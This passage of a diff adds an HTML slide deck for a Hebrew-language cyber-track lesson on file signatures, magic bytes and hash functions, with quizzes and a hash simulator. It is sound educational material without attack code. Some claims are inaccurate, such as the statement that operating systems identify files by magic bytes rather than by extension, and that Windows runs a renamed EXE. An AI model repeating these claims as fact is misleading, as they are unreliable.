@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Analysis & Integrity | שיעור 7 | מגמת סייבר</title>
+<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;600;700;900&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#030507;--s1:#080d14;--s2:#0d1520;--s3:#121e2c;
+  --border:#1a2e44;--border2:#243d55;
+  --lime:#b5ff3a;--red:#ff3366;--blue:#33aaff;--gold:#ffc933;
+  --pink:#ff69d9;--teal:#00e5cc;--orange:#ff7733;
+  --white:#dde8f5;--dim:#4a6888;--dim2:#2e4a62;
+  --text:#c5d8ec;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background:var(--bg);color:var(--text);
+  font-family:'Heebo',sans-serif;
+  overflow:hidden;height:100vh;width:100vw;
+}
+/* NOISE TEXTURE */
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:0;opacity:.4;
+}
+
+/* ── ENGINE ── */
+.deck{width:100%;height:100vh;position:relative;overflow:hidden;z-index:1;}
+.slide{
+  position:absolute;inset:0;display:flex;flex-direction:column;
+  padding:40px 62px 84px;
+  opacity:0;pointer-events:none;
+  transition:opacity .32s ease,transform .32s ease;
+  transform:translateX(-20px);overflow:hidden;
+}
+.slide.active{opacity:1;pointer-events:all;transform:translateX(0);}
+.slide.out{opacity:0;transform:translateX(20px);}
+
+/* ── PROGRESS ── */
+.pbar{position:fixed;top:0;left:0;height:2px;
+  background:linear-gradient(to left,var(--lime),var(--teal),var(--blue));
+  transition:width .35s ease;z-index:100;}
+
+/* ── NAV ── */
+nav{
+  position:fixed;bottom:18px;left:50%;transform:translateX(-50%);
+  display:flex;align-items:center;gap:12px;
+  background:rgba(8,13,20,.97);border:1px solid var(--border);
+  padding:7px 14px;z-index:50;backdrop-filter:blur(20px);
+}
+.nb{background:none;border:1px solid var(--border);color:var(--dim);
+  cursor:pointer;padding:4px 14px;font-family:'Fira Code',monospace;
+  font-size:1.2rem;transition:all .18s;letter-spacing:1px;}
+.nb:hover:not(:disabled){border-color:var(--lime);color:var(--lime);}
+.nb:disabled{opacity:.2;cursor:default;}
+.sc{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);min-width:50px;text-align:center;}
+
+/* ── XP ── */
+.xp{position:fixed;top:14px;left:16px;z-index:50;
+  font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim);}
+.xv{color:var(--lime);font-size:1.2rem;font-weight:600;}
+@keyframes xpop{0%{transform:scale(1)}45%{transform:scale(1.22)}100%{transform:scale(1)}}
+.xpop{animation:xpop .22s ease;}
+
+/* ── BADGE ── */
+.badge{font-family:'Fira Code',monospace;font-size:1.2rem;letter-spacing:3px;
+  text-transform:uppercase;padding:3px 10px;display:inline-block;
+  margin-bottom:14px;border:1px solid;width:fit-content;}
+.b-i{color:var(--blue);border-color:rgba(51,170,255,.3);background:rgba(51,170,255,.06);}
+.b-c{color:var(--pink);border-color:rgba(255,105,217,.3);background:rgba(255,105,217,.06);}
+.b-q{color:var(--gold);border-color:rgba(255,201,51,.3);background:rgba(255,201,51,.06);}
+.b-m{color:var(--red);border-color:rgba(255,51,102,.3);background:rgba(255,51,102,.06);}
+.b-g{color:var(--lime);border-color:rgba(181,255,58,.3);background:rgba(181,255,58,.06);}
+.b-t{color:var(--teal);border-color:rgba(0,229,204,.3);background:rgba(0,229,204,.06);}
+
+/* ── TYPE ── */
+h1{font-size:clamp(1.9rem,4.2vw,3rem);font-weight:900;line-height:1.1;}
+h2{font-size:clamp(1.2rem,2.5vw,1.9rem);font-weight:700;line-height:1.2;margin-bottom:6px;}
+h3{font-size:1.2rem;font-weight:600;color:#fff;margin-bottom:5px;}
+p{color:var(--dim);line-height:1.7;font-size:1.2rem;}
+.gl{color:var(--lime);text-shadow:0 0 14px rgba(181,255,58,.35);}
+.gb{color:var(--blue);}
+.gg{color:var(--gold);}
+.gt{color:var(--teal);}
+.gp{color:var(--pink);}
+.gr{color:var(--red);}
+code{font-family:'Fira Code',monospace;color:var(--blue);font-size:.86em;}
+
+/* ── CODE BLOCK ── */
+.cb{
+  background:#020406;border:1px solid var(--border);
+  border-right:3px solid var(--lime);
+  padding:13px 17px;font-family:'Fira Code',monospace;
+  font-size:1.2rem;color:#90b0cc;line-height:1.85;
+  margin:8px 0;overflow:auto;max-height:210px;
+  direction:ltr;text-align:left;
+}
+.cb::-webkit-scrollbar{width:3px;height:3px;}
+.cb::-webkit-scrollbar-thumb{background:var(--border2);}
+.cb::-webkit-scrollbar-thumb:hover{background:var(--lime);}
+.kw{color:var(--red);}
+.fn{color:var(--teal);}
+.cm{color:#2a4460;font-style:italic;}
+.st{color:var(--lime);}
+.nm{color:var(--gold);}
+.hx{color:var(--pink);}
+.op{color:var(--orange);}
+
+/* ── CARDS ── */
+.cg{display:grid;gap:10px;}
+.cg2{grid-template-columns:1fr 1fr;}
+.cg3{grid-template-columns:1fr 1fr 1fr;}
+.cg4{grid-template-columns:1fr 1fr 1fr 1fr;}
+.card{background:var(--s1);border:1px solid var(--border);padding:13px 15px;position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;}
+.cl::before{background:var(--lime);}
+.cb2::before{background:var(--blue);}
+.cg2c::before{background:var(--gold);}
+.cp::before{background:var(--pink);}
+.ct::before{background:var(--teal);}
+.cr::before{background:var(--red);}
+.co::before{background:var(--orange);}
+.card p{font-size:1.2rem;margin-top:4px;}
+.ci{font-size:1.4rem;margin-bottom:6px;display:block;}
+
+/* ── LAYOUTS ── */
+.c2{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.c6040{display:grid;grid-template-columns:1.5fr 1fr;gap:16px;}
+.c4060{display:grid;grid-template-columns:1fr 1.5fr;gap:16px;}
+.sc2{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+.scr{flex:1;overflow-y:auto;padding-bottom:8px;}
+.scr::-webkit-scrollbar{width:3px;}
+.scr::-webkit-scrollbar-thumb{background:var(--border);}
+
+/* ── SECTION HERO ── */
+.shero{display:flex;flex-direction:column;justify-content:center;height:100%;}
+.snum{font-family:'Fira Code',monospace;font-size:4.5rem;font-weight:900;line-height:1;margin-bottom:-14px;}
+.stit{font-size:clamp(1.7rem,3vw,2.7rem);font-weight:900;}
+
+/* ── TITLE HERO ── */
+.thero{display:flex;flex-direction:column;justify-content:center;height:100%;position:relative;}
+.lnum{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);letter-spacing:4px;margin-bottom:10px;}
+.ttags{display:flex;gap:6px;margin-top:18px;flex-wrap:wrap;}
+.ttag{font-family:'Fira Code',monospace;font-size:1.2rem;padding:2px 8px;border:1px solid var(--border);color:var(--dim2);}
+.bigbg{
+  font-family:'Fira Code',monospace;font-size:7rem;font-weight:900;
+  color:rgba(181,255,58,.025);position:absolute;left:16px;top:50%;
+  transform:translateY(-50%);line-height:1;pointer-events:none;user-select:none;
+}
+
+/* ── QUIZ ── */
+.qc{display:flex;flex-direction:column;gap:8px;margin-top:10px;}
+.qo{
+  background:var(--s1);border:1px solid var(--border);
+  padding:10px 14px;cursor:pointer;font-size:1.2rem;color:var(--text);
+  transition:all .16s;display:flex;align-items:center;gap:9px;
+}
+.qo:hover{border-color:rgba(181,255,58,.35);background:rgba(181,255,58,.03);}
+.qo.correct{border-color:var(--lime);background:rgba(181,255,58,.07);color:#fff;}
+.qo.wrong{border-color:var(--red);background:rgba(255,51,102,.07);color:var(--red);}
+.qo.disabled{pointer-events:none;}
+.ql{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--lime);
+  background:rgba(181,255,58,.1);width:22px;height:22px;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.qfb{margin-top:9px;padding:9px 13px;font-size:1.2rem;display:none;border:1px solid;}
+.qfb.show{display:block;}
+.qfb.ok{border-color:var(--lime);background:rgba(181,255,58,.05);color:var(--lime);}
+.qfb.no{border-color:var(--red);background:rgba(255,51,102,.05);color:var(--red);}
+
+/* ── FILL ── */
+.fi{background:rgba(255,201,51,.06);border:none;border-bottom:2px solid var(--gold);
+  color:var(--gold);font-family:'Fira Code',monospace;font-size:1.2rem;
+  padding:1px 5px;outline:none;transition:border-color .18s;min-width:80px;}
+.fi:focus{border-color:var(--blue);color:var(--blue);}
+.fi.ok{border-color:var(--lime);color:var(--lime);background:rgba(181,255,58,.06);}
+.fi.no{border-color:var(--red);color:var(--red);background:rgba(255,51,102,.05);}
+.ck{margin-top:9px;background:none;border:1px solid var(--lime);
+  color:var(--lime);font-family:'Fira Code',monospace;font-size:1.2rem;
+  padding:5px 15px;cursor:pointer;transition:all .16s;}
+.ck:hover{background:rgba(181,255,58,.07);}
+.ffb{margin-top:7px;font-size:1.2rem;display:none;}
+.ffb.show{display:block;}
+
+/* ── MISSION ── */
+.mbox{
+  background:rgba(255,51,102,.035);border:1px solid rgba(255,51,102,.2);
+  padding:16px 20px;margin-top:9px;position:relative;
+}
+.mbox::before{content:'▶ MISSION';position:absolute;top:-9px;right:14px;
+  font-family:'Fira Code',monospace;font-size:1.2rem;
+  background:var(--bg);color:var(--red);padding:0 6px;letter-spacing:2px;}
+.msteps{list-style:none;margin-top:10px;}
+.msteps li{display:flex;gap:9px;align-items:flex-start;
+  font-size:1.2rem;color:var(--text);margin-bottom:7px;}
+.msteps li::before{content:attr(data-n);font-family:'Fira Code',monospace;font-size:1.2rem;
+  color:var(--red);background:rgba(255,51,102,.1);
+  width:18px;height:18px;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;margin-top:2px;}
+
+/* ── TIMER ── */
+.tw{display:flex;align-items:center;gap:10px;
+  background:var(--s1);border:1px solid var(--border);
+  padding:7px 14px;margin-top:10px;width:fit-content;}
+.td{font-family:'Fira Code',monospace;font-size:1.45rem;color:var(--teal);font-weight:600;min-width:64px;}
+.td.urg{color:var(--red);animation:urgt .48s ease infinite alternate;}
+@keyframes urgt{from{opacity:1}to{opacity:.25}}
+.tb{background:none;border:1px solid var(--border);color:var(--dim);
+  cursor:pointer;padding:4px 10px;font-family:'Fira Code',monospace;font-size:1.2rem;transition:all .16s;}
+.tb:hover{border-color:var(--teal);color:var(--teal);}
+
+/* ── HEX VIEWER ── */
+.hex-wrap{
+  background:#010305;border:1px solid var(--border);
+  font-family:'Fira Code',monospace;font-size:1.2rem;
+  padding:12px 16px;overflow-x:auto;direction:ltr;text-align:left;
+  line-height:1.9;max-height:180px;overflow-y:auto;
+}
+.hex-wrap::-webkit-scrollbar{width:3px;height:3px;}
+.hex-wrap::-webkit-scrollbar-thumb{background:var(--border2);}
+.hex-addr{color:var(--dim2);}
+.hex-byte{color:#7aabcc;}
+.hex-sig{color:var(--lime);font-weight:600;}
+.hex-null{color:var(--dim2);}
+.hex-ascii{color:var(--gold);}
+.hex-row{display:flex;gap:12px;align-items:center;}
+
+/* ── HASH DEMO ── */
+.hash-demo{
+  background:var(--s1);border:1px solid var(--border);padding:14px 16px;
+  margin:10px 0;
+}
+.hash-input{
+  width:100%;background:var(--s2);border:1px solid var(--border2);
+  color:var(--text);font-family:'Fira Code',monospace;font-size:1.2rem;
+  padding:8px 12px;outline:none;transition:border-color .2s;
+  direction:ltr;text-align:left;
+}
+.hash-input:focus{border-color:var(--teal);}
+.hash-result{
+  margin-top:8px;font-family:'Fira Code',monospace;font-size:1.2rem;
+  display:flex;flex-direction:column;gap:4px;direction:ltr;text-align:left;
+}
+.hash-line{display:flex;gap:10px;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);}
+.hash-line:last-child{border-bottom:none;}
+.hash-alg{color:var(--dim);min-width:60px;font-size:1.2rem;}
+.hash-val{color:var(--lime);word-break:break-all;flex:1;font-size:1.2rem;}
+.hash-btn{
+  margin-top:8px;background:none;border:1px solid var(--teal);
+  color:var(--teal);font-family:'Fira Code',monospace;font-size:1.2rem;
+  padding:5px 14px;cursor:pointer;transition:all .18s;
+}
+.hash-btn:hover{background:rgba(0,229,204,.08);}
+
+/* ── SIGNATURE TABLE ── */
+.sig-table{width:100%;border-collapse:collapse;font-size:1.2rem;}
+.sig-table th{text-align:right;padding:7px 11px;background:var(--s2);
+  border-bottom:2px solid var(--lime);color:var(--lime);
+  font-family:'Fira Code',monospace;font-size:1.2rem;letter-spacing:1px;}
+.sig-table td{padding:7px 11px;border-bottom:1px solid var(--border);color:var(--dim);vertical-align:middle;}
+.sig-table tr:hover td{background:rgba(181,255,58,.02);}
+.sig-bytes{font-family:'Fira Code',monospace;color:var(--pink);font-size:1.2rem;}
+.sig-ext{font-family:'Fira Code',monospace;color:var(--gold);font-size:1.2rem;}
+.sig-ok{color:var(--lime);}
+.sig-warn{color:var(--red);}
+
+/* ── RLIST ── */
+.rlist{list-style:none;}
+.rlist li{padding:8px 0;border-bottom:1px solid var(--border);
+  display:flex;gap:9px;align-items:flex-start;
+  cursor:pointer;transition:all .16s;font-size:1.2rem;}
+.rlist li:hover{color:#fff;}
+.ri-d{display:none;font-size:1.2rem;color:var(--dim);margin-top:3px;}
+.rlist li.open .ri-d{display:block;}
+.rlist li.open{color:var(--lime);}
+
+/* ── DRAG & DROP ── */
+.dnd-wrap{display:flex;gap:14px;margin-top:10px;}
+.dnd-pool{flex:1;padding:10px;min-height:90px;border:1px dashed var(--border);background:var(--s1);}
+.dnd-zone{flex:2;display:flex;flex-direction:column;gap:8px;}
+.dnd-target{
+  border:1px dashed rgba(181,255,58,.3);background:rgba(181,255,58,.02);
+  padding:8px 12px;min-height:44px;display:flex;align-items:center;gap:10px;
+}
+.dnd-target.over{border-color:var(--lime);background:rgba(181,255,58,.06);}
+.dnd-target-lbl{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);min-width:80px;flex-shrink:0;}
+.dnd-chip{
+  background:var(--s2);border:1px solid var(--border2);
+  padding:5px 11px;cursor:grab;
+  font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--teal);
+  user-select:none;transition:all .14s;display:inline-block;width:100%;margin:4px 0;
+}
+.dnd-chip:hover{border-color:var(--teal);}
+.dnd-chip.dragging{opacity:.3;}
+.dnd-lbl{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);margin-bottom:6px;letter-spacing:2px;}
+.dnd-result{margin-top:8px;font-size:1.2rem;display:none;}
+.dnd-result.show{display:block;}
+
+/* ── FORENSICS TIMELINE ── */
+.timeline{position:relative;padding-right:28px;margin-top:6px;}
+.timeline::before{content:'';position:absolute;right:12px;top:6px;bottom:6px;
+  width:1px;background:linear-gradient(to bottom,var(--lime),var(--teal),var(--pink));}
+.tl-item{position:relative;margin-bottom:16px;
+  background:var(--s1);border:1px solid var(--border);padding:12px 15px;}
+.tl-item::before{content:'';position:absolute;right:-20px;top:14px;
+  width:10px;height:10px;border-radius:50%;border:2px solid var(--lime);
+  background:var(--bg);box-shadow:0 0 6px var(--lime);}
+.tl-time{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--teal);margin-bottom:4px;}
+.tl-title{font-weight:600;color:#fff;font-size:1.2rem;margin-bottom:3px;}
+.tl-body{font-size:1.2rem;color:var(--dim);}
+.tl-bad{border-color:rgba(255,51,102,.35);background:rgba(255,51,102,.04);}
+.tl-bad::before{border-color:var(--red);box-shadow:0 0 6px var(--red);}
+
+/* ── INTEGRITY CHECKER SIM ── */
+.ic-wrap{background:var(--s1);border:1px solid var(--border);padding:14px;}
+.ic-file{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:8px 12px;border-bottom:1px solid var(--border);
+  font-family:'Fira Code',monospace;font-size:1.2rem;cursor:pointer;
+  transition:all .16s;
+}
+.ic-file:last-child{border-bottom:none;}
+.ic-file:hover{background:rgba(181,255,58,.03);}
+.ic-name{color:var(--text);flex:1;}
+.ic-hash{color:var(--dim);font-size:1.2rem;flex:2;margin-right:10px;}
+.ic-status{font-size:1.2rem;padding:2px 8px;border:1px solid;flex-shrink:0;}
+.ic-ok{color:var(--lime);border-color:rgba(181,255,58,.3);}
+.ic-changed{color:var(--red);border-color:rgba(255,51,102,.3);}
+.ic-new{color:var(--gold);border-color:rgba(255,201,51,.3);}
+.ic-del{color:var(--pink);border-color:rgba(255,105,217,.3);}
+
+/* ── STEP REVEAL ── */
+.steps-wrap{display:flex;flex-direction:column;gap:8px;margin-top:10px;}
+.step-item{
+  background:var(--s1);border:1px solid var(--border);padding:11px 14px;
+  cursor:pointer;transition:all .2s;position:relative;
+}
+.step-item.revealed{border-color:rgba(181,255,58,.3);background:rgba(181,255,58,.03);}
+.step-num{font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--lime);margin-bottom:3px;}
+.step-title{font-weight:600;font-size:1.2rem;color:#fff;}
+.step-body{display:none;font-size:1.2rem;color:var(--dim);margin-top:6px;line-height:1.6;}
+.step-item.revealed .step-body{display:block;}
+.step-icon{position:absolute;top:10px;left:14px;font-size:1.2rem;transition:transform .2s;}
+.step-item.revealed .step-icon{transform:rotate(90deg);}
+
+/* ── KB ── */
+.kbh{position:fixed;bottom:18px;right:16px;font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--border2);}
+</style>
+</head>
+<body>
+
+<div class="pbar" id="pb"></div>
+<div class="xp">XP: <span class="xv" id="xv">0</span></div>
+
+<div class="deck" id="deck">
+
+<!-- ═══════════════════════════════════ -->
+<!-- S0: TITLE -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide active" id="s0">
+  <div class="bigbg">FA</div>
+  <div class="thero">
+    <div class="lnum">// LESSON_07 · FILE ANALYSIS & INTEGRITY</div>
+    <h1>ניתוח וזיהוי<br><span class="gl">תקינות קבצים</span></h1>
+    <p style="margin-top:10px;font-size:1.2rem">File Signatures · Checksums · Hashes · Forensics</p>
+    <div class="ttags">
+      <span class="ttag">שיעור 7/8</span>
+      <span class="ttag">90 דקות</span>
+      <span class="ttag">מגמת סייבר</span>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S1: AGENDA -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s1">
+  <span class="badge b-i">// סדר היום</span>
+  <h2>מה נלמד היום?</h2>
+  <div class="sc2" style="margin-top:12px">
+    <ul class="rlist">
+      <li onclick="rv(this)">
+        <span style="color:var(--lime);flex-shrink:0">🧬</span>
+        <div><div><strong>File Signatures / Magic Bytes</strong> — איך הOS מזהה קבצים</div>
+        <div class="ri-d">כל פורמט קובץ מתחיל בבייטים קבועים. FF D8 FF = JPEG. 89 50 4E 47 = PNG. תוקפים מסתירים malware על ידי שינוי הסיומת.</div></div>
+      </li>
+      <li onclick="rv(this)">
+        <span style="color:var(--lime);flex-shrink:0">🔢</span>
+        <div><div><strong>Checksums & Hashes</strong> — טביעת אצבע של קובץ</div>
+        <div class="ri-d">MD5, SHA-1, SHA-256 — פונקציות חד-כיווניות. שינוי בית אחד = hash שונה לחלוטין. בסיס לאימות תקינות.</div></div>
+      </li>
+      <li onclick="rv(this)">
+        <span style="color:var(--lime);flex-shrink:0">🔍</span>
+        <div><div><strong>File Integrity Monitoring</strong> — זיהוי שינויים</div>
+        <div class="ri-d">AIDE, Tripwire, Wazuh — שמירת hash של קבצים ובדיקה תקופתית. שינוי ב-/etc/passwd = alert!</div></div>
+      </li>
+      <li onclick="rv(this)">
+        <span style="color:var(--lime);flex-shrink:0">💾</span>
+        <div><div><strong>File Carving & Recovery</strong> — שחזור קבצים</div>
+        <div class="ri-d">Foremost, Scalpel, PhotoRec — איתור signatures בדיסק גולמי. קבצים "נמחקו" אבל הנתונים עדיין שם.</div></div>
+      </li>
+      <li onclick="rv(this)">
+        <span style="color:var(--lime);flex-shrink:0">🕵️</span>
+        <div><div><strong>Forensic Analysis</strong> — חקירה פורנזית</div>
+        <div class="ri-d">שרשרת ראיות, timeline, volatility analysis, strings & binwalk. מה עשה התוקף ומתי.</div></div>
+      </li>
+    </ul>
+    <p style="margin-top:8px;font-size:1.2rem;color:var(--dim2)">👆 לחץ לפרטים</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S2: SECTION — SIGNATURES -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s2">
+  <div class="shero">
+    <div class="snum" style="color:rgba(181,255,58,.05)">01</div>
+    <div class="stit"><span class="gl">File</span></div>
+    <div class="stit"><span class="gl">Signatures</span></div>
+    <p style="margin-top:8px;font-size:1.2rem">Magic Bytes — DNA של קבצים</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S3: MAGIC BYTES CONCEPT -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s3">
+  <span class="badge b-c">// מושג</span>
+  <h2>Magic Bytes — <span class="gl">הבייטים שמזהים הכל</span></h2>
+  <div class="c6040" style="margin-top:10px;flex:1">
+    <div class="scr">
+      <p style="margin-bottom:10px">כל פורמט קובץ מתחיל ב<strong style="color:#fff">בייטים קבועים</strong> — ה-OS קורא אותם ומזהה את הסוג. <strong style="color:var(--red)">לא הסיומת!</strong></p>
+      <div class="hex-wrap" style="margin-bottom:10px">
+        <div style="color:var(--dim2);font-size:1.2rem;margin-bottom:6px">// HEX VIEWER — magic bytes highlighted</div>
+        <div class="hex-row">
+          <span class="hex-addr">0000:</span>
+          <span><span class="hex-sig">FF D8 FF E0</span> <span class="hex-byte">00 10 4A 46</span> <span class="hex-byte">49 46 00 01</span></span>
+          <span class="hex-ascii">...JFIF..</span>
+        </div>
+        <div style="color:var(--lime);font-size:1.2rem;margin:2px 0 6px 44px">↑ JPEG signature</div>
+        <div class="hex-row">
+          <span class="hex-addr">0000:</span>
+          <span><span class="hex-sig">89 50 4E 47</span> <span class="hex-byte">0D 0A 1A 0A</span> <span class="hex-byte">00 00 00 0D</span></span>
+          <span class="hex-ascii">.PNG....</span>
+        </div>
+        <div style="color:var(--lime);font-size:1.2rem;margin:2px 0 6px 44px">↑ PNG signature</div>
+        <div class="hex-row">
+          <span class="hex-addr">0000:</span>
+          <span><span class="hex-sig">4D 5A</span> <span class="hex-byte">90 00 03 00</span> <span class="hex-byte">00 00 04 00</span></span>
+          <span class="hex-ascii">MZ......</span>
+        </div>
+        <div style="color:var(--red);font-size:1.2rem;margin:2px 0 6px 44px">↑ PE Executable (Windows EXE/DLL)</div>
+        <div class="hex-row">
+          <span class="hex-addr">0000:</span>
+          <span><span class="hex-sig">50 4B 03 04</span> <span class="hex-byte">14 00 00 00</span> <span class="hex-byte">08 00 CD 44</span></span>
+          <span class="hex-ascii">PK......</span>
+        </div>
+        <div style="color:var(--gold);font-size:1.2rem;margin:2px 0 0 44px">↑ ZIP / JAR / DOCX / APKX (כולם ZIP בפנים!)</div>
+      </div>
+      <pre class="cb" style="max-height:130px">
+<span class="cm"># Python — קריאת magic bytes</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="st">"file.jpg"</span>, <span class="st">"rb"</span>) <span class="kw">as</span> f:
+    magic = f.<span class="fn">read</span>(<span class="nm">4</span>)
+    <span class="fn">print</span>(magic.<span class="fn">hex</span>())   <span class="cm"># ffd8ffe0</span>
+
+<span class="cm"># Linux — file command</span>
+$ file suspicious.exe
+suspicious.exe: <span class="hx">JPEG image data</span>  <span class="cm">← שם מטעה!</span>
+
+<span class="cm"># xxd / hexdump</span>
+$ xxd malware.pdf | head -2
+      </pre>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:9px">
+      <div class="card cr">
+        <h3>🔴 מתקפה: Extension Spoofing</h3>
+        <p>תוקף שומר malware.exe בשם <code>vacation.jpg</code>. User לוחץ, Windows מריץ EXE. <code>file</code> command מזהה את האמת.</p>
+      </div>
+      <div class="card cl">
+        <h3>🛡️ הגנה</h3>
+        <p>בדוק תמיד magic bytes, לא סיומת. Email filters, AV — כולם קוראים signatures.</p>
+      </div>
+      <div class="card ct">
+        <h3>💡 Polyglot File</h3>
+        <p>קובץ שתקף כ<strong style="color:#fff">שני פורמטים</strong>. GIFAR = GIF + JAR. נראה כ-GIF לנדפסר, רץ כ-Java.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S4: SIGNATURE TABLE + QUIZ -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s4">
+  <span class="badge b-q">// שאלת הבנה #1</span>
+  <h2>זיהוי Magic Bytes</h2>
+  <p style="margin-bottom:10px">לפניך תחילת קובץ בhex. זהה את הסוג:</p>
+  <div class="hex-wrap" style="margin-bottom:14px;max-height:70px">
+    <div class="hex-row">
+      <span class="hex-addr">0000:</span>
+      <span><span class="hex-sig">25 50 44 46</span> <span class="hex-byte">2D 31 2E 34</span> <span class="hex-byte">0A 25 E2 E3</span></span>
+      <span class="hex-ascii">%PDF-1.4.</span>
+    </div>
+  </div>
+  <div class="qc" id="q1">
+    <div class="qo" onclick="cq('q1',this,false)"><span class="ql">א</span> קובץ ZIP — PK signature</div>
+    <div class="qo" onclick="cq('q1',this,false)"><span class="ql">ב</span> קובץ EXE — MZ header</div>
+    <div class="qo" onclick="cq('q1',this,true)"><span class="ql">ג</span> קובץ PDF — 25 50 44 46 = "%PDF"</div>
+    <div class="qo" onclick="cq('q1',this,false)"><span class="ql">ד</span> קובץ JPEG — FF D8 FF</div>
+  </div>
+  <div class="qfb" id="q1-fb"></div>
+  <div class="card cg2c" style="margin-top:12px">
+    <h3>📋 טבלת Signatures — הנפוצות בסייבר</h3>
+    <table class="sig-table" style="margin-top:8px">
+      <thead><tr><th>סוג</th><th>Magic Bytes (Hex)</th><th>ASCII</th><th>הערה</th></tr></thead>
+      <tbody>
+        <tr><td class="sig-ext">PDF</td><td class="sig-bytes">25 50 44 46</td><td>%PDF</td><td>נפוץ ב-exploits</td></tr>
+        <tr><td class="sig-ext">EXE/DLL</td><td class="sig-bytes">4D 5A</td><td>MZ</td><td class="sig-warn">⚠️ שינוי שם לא מסתיר</td></tr>
+        <tr><td class="sig-ext">ZIP/DOCX</td><td class="sig-bytes">50 4B 03 04</td><td>PK</td><td>גם .jar, .apk, .docx</td></tr>
+        <tr><td class="sig-ext">ELF (Linux)</td><td class="sig-bytes">7F 45 4C 46</td><td>.ELF</td><td>Linux binary</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S5: SECTION — CHECKSUMS & HASHES -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s5">
+  <div class="shero">
+    <div class="snum" style="color:rgba(0,229,204,.05)">02</div>
+    <div class="stit"><span class="gt">Checksums</span></div>
+    <div class="stit"><span class="gt">&amp; Hashes</span></div>
+    <p style="margin-top:8px;font-size:1.2rem">טביעת אצבע דיגיטלית של קובץ</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S6: HASH CONCEPT + LIVE DEMO -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s6">
+  <span class="badge b-c">// מושג + סימולטור</span>
+  <h2><span class="gt">Hash Functions</span> — נסה בעצמך</h2>
+  <div class="c4060" style="margin-top:10px;flex:1">
+    <div class="scr">
+      <p style="margin-bottom:8px">פונקציית hash מקבלת קובץ ומוציאה מחרוזת בגודל קבוע. <strong style="color:#fff">שינוי בייט אחד = hash שונה לחלוטין</strong>.</p>
+      <div class="cg cg3" style="gap:7px;margin-bottom:10px">
+        <div class="card cb2" style="text-align:center">
+          <div style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--blue)">MD5</div>
+          <div style="font-size:1.2rem;margin-top:3px">128 bit<br>מהיר, שבור</div>
+        </div>
+        <div class="card ct" style="text-align:center">
+          <div style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--teal)">SHA-1</div>
+          <div style="font-size:1.2rem;margin-top:3px">160 bit<br>deprecated</div>
+        </div>
+        <div class="card cl" style="text-align:center">
+          <div style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--lime)">SHA-256</div>
+          <div style="font-size:1.2rem;margin-top:3px">256 bit<br>✅ מומלץ</div>
+        </div>
+      </div>
+      <div class="card cr">
+        <h3>⚠️ תכונות קריטיות</h3>
+        <p><strong style="color:#fff">חד-כיווני</strong> — לא ניתן לחשב hash→מקור<br>
+        <strong style="color:#fff">Deterministic</strong> — אותו input = אותו output<br>
+        <strong style="color:#fff">Avalanche effect</strong> — שינוי בייט 1 = hash שונה<br>
+        <strong style="color:#fff">Collision resistant</strong> — קשה מאוד לשניים עם אותו hash</p>
+      </div>
+    </div>
+    <div class="scr">
+      <div class="hash-demo">
+        <div style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);margin-bottom:8px;letter-spacing:2px">// LIVE HASH SIMULATOR</div>
+        <input class="hash-input" id="hashInput" placeholder="הקלד כלשהו..." oninput="calcHash()" value="Hello, Cyber!">
+        <div class="hash-result" id="hashResult"></div>
+        <button class="hash-btn" onclick="document.getElementById('hashInput').value='Hello, Cyber!';calcHash()">↺ אפס</button>
+      </div>
+      <div class="card cg2c" style="margin-top:8px">
+        <h3>💡 נסה זאת</h3>
+        <p>שנה רק אות אחת — ראה כמה ה-hash משתנה. הוסף רווח בסוף. זה ה-Avalanche Effect!</p>
+      </div>
+    </div>
+  </div>
+</div>
+
